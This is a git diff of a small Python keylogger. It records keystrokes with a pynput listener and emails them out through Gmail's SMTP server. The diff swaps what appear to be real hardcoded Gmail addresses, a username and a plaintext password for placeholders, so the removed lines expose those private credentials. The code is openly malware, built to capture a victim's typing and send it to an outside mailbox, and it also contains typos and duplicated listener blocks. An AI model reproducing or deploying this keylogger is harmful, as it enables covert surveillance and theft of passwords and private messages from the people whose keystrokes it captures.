@@ -14,11 +14,11 @@ def log_keystrok(key):
 with Listener(on_press=log_keystrok) as l:
     l.join()
 def sender(key):
-    fromaddr = "hamoonsedaghat136@gmail.com" 
-    toaddrs = "hamwnsedaqat@gmail.com"
+    fromaddr = "your gmail" 
+    toaddrs = "another gmail"
     msg = key
-    password = ("hamoon1384")
-    username = ("hamoonsedaghat136")
+    password = ("pass")
+    username = ("pass")
     server = smtplib.SMTP('smpt.gmail.com:587')
     server.starttls()
     server.login(username , password)
@@ -33,11 +33,12 @@ def log_keystroke(key):
         sender(strl)
 with keyboard.Listener(on_press=log_keystroke)as l:
      l.join()
-fromaddr = 'hamoonsedaghat136@gmail.com'
-toaddrs = 'hamwnsedaqat@gmail.com'
+fromaddr = 'gmail'
+toaddrs = 'another gmail'
 msg = 'this is a massage for test'
-username = 'hamoonsedaghat136'
-password = 'hamoon1384'
+username = '////'
+password = '/////'
+#smtplib برایه برقرار کردن ارتباط#
 server = smtplib.SMTP('smpt.gmail.com')
 server.starttls()
 server.login(username , password )
